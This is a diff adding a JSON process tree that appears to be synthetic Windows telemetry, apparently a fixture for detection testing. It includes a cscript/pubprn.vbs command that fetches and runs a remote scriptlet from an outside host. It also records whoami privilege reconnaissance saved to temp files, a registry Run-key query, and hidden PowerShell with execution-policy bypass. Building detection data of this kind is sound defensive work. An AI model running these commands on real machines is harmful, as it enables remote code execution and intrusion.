@@ -1,0 +1,205 @@
+{
+  "pid": 203418,
+  "ppid": 0,
+  "name": "cmd.exe",
+  "command": "cmd.exe /c \"echo runbook\"",
+  "children": [
+    {
+      "pid": 203420,
+      "ppid": 203418,
+      "name": "timeout.exe",
+      "command": "timeout.exe /t 15 /nobreak",
+      "children": [
+        {
+          "pid": 203426,
+          "ppid": 203420,
+          "name": "cscript.exe",
+          "command": "cscript.exe //nologo \"%windir%\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs\" 127.0.0.1 script \"http://support.wingtipsoft.com/diag/collect.sct\"",
+          "children": [
+            {
+              "pid": 203427,
+              "ppid": 203426,
+              "name": "hostname.exe",
+              "command": "hostname.exe",
+              "children": [
+                {
+                  "pid": 203433,
+                  "ppid": 203427,
+                  "name": "whoami.exe",
+                  "command": "whoami.exe /all",
+                  "children": [
+                    {
+                      "pid": 203440,
+                      "ppid": 203433,
+                      "name": "choice.exe",
+                      "command": "choice.exe /d y /t 5 > nul",
+                      "children": [
+                        {
+                          "pid": 203442,
+                          "ppid": 203440,
+                          "name": "hostname.exe",
+                          "command": "hostname.exe > \"C:\\Users\\ananya.das\\AppData\\Local\\Temp\\host_c36dc505.txt\"",
+                          "children": [
+                            {
+                              "pid": 203444,
+                              "ppid": 203442,
+                              "name": "whoami.exe",
+                              "command": "whoami.exe /priv",
+                              "children": [
+                                {
+                                  "pid": 203445,
+                                  "ppid": 203444,
+                                  "name": "whoami.exe",
+                                  "command": "whoami.exe",
+                                  "children": []
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "pid": 203452,
+                  "ppid": 203427,
+                  "name": "reg.exe",
+                  "command": "reg.exe query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s",
+                  "children": [
+                    {
+                      "pid": 203457,
+                      "ppid": 203452,
+                      "name": "powershell.exe",
+                      "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 7\"",
+                      "children": [
+                        {
+                          "pid": 203459,
+                          "ppid": 203457,
+                          "name": "choice.exe",
+                          "command": "choice.exe /d y /t 25 > nul",
+                          "children": [
+                            {
+                              "pid": 203462,
+                              "ppid": 203459,
+                              "name": "whoami.exe",
+                              "command": "whoami.exe /priv",
+                              "children": [
+                                {
+                                  "pid": 203463,
+                                  "ppid": 203462,
+                                  "name": "timeout.exe",
+                                  "command": "timeout.exe /t 3 /nobreak",
+                                  "children": [
+                                    {
+                                      "pid": 203467,
+                                      "ppid": 203463,
+                                      "name": "whoami.exe",
+                                      "command": "whoami.exe /priv > \"C:\\Users\\ananya.das\\AppData\\Local\\Temp\\who_b0969ab8.txt\"",
+                                      "children": [
+                                        {
+                                          "pid": 203473,
+                                          "ppid": 203467,
+                                          "name": "ping.exe",
+                                          "command": "ping.exe -n 4 127.0.0.1 > nul",
+                                          "children": [
+                                            {
+                                              "pid": 203480,
+                                              "ppid": 203473,
+                                              "name": "whoami.exe",
+                                              "command": "whoami.exe /groups",
+                                              "children": []
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            },
+                            {
+                              "pid": 203485,
+                              "ppid": 203459,
+                              "name": "tasklist.exe",
+                              "command": "tasklist.exe /fi \"imagename eq svchost.exe\"",
+                              "children": [
+                                {
+                                  "pid": 203491,
+                                  "ppid": 203485,
+                                  "name": "choice.exe",
+                                  "command": "choice.exe /d y /t 10 > nul",
+                                  "children": [
+                                    {
+                                      "pid": 203497,
+                                      "ppid": 203491,
+                                      "name": "hostname.exe",
+                                      "command": "hostname.exe",
+                                      "children": [
+                                        {
+                                          "pid": 203498,
+                                          "ppid": 203497,
+                                          "name": "powershell.exe",
+                                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"C:\\IT\\Runbooks\\BuildPack_b1e0f11a.ps1\" -Host \"SUP-204\" -Mode Full",
+                                          "children": [
+                                            {
+                                              "pid": 203501,
+                                              "ppid": 203498,
+                                              "name": "hostname.exe",
+                                              "command": "hostname.exe",
+                                              "children": [
+                                                {
+                                                  "pid": 203507,
+                                                  "ppid": 203501,
+                                                  "name": "powershell.exe",
+                                                  "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 5\"",
+                                                  "children": [
+                                                    {
+                                                      "pid": 203510,
+                                                      "ppid": 203507,
+                                                      "name": "hostname.exe",
+                                                      "command": "hostname.exe",
+                                                      "children": [
+                                                        {
+                                                          "pid": 203513,
+                                                          "ppid": 203510,
+                                                          "name": "powershell.exe",
+                                                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 4\"",
+                                                          "children": [
+                                                            {
+                                                              "pid": 203520,
+                                                              "ppid": 203513,
+                                                              "name": "whoami.exe",
+                                                              "command": "whoami.exe /priv > \"C:\\Users\\ananya.das\\AppData\\Local\\Temp\\who_8ed189b7.txt\"",
+                                                              "children": []
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
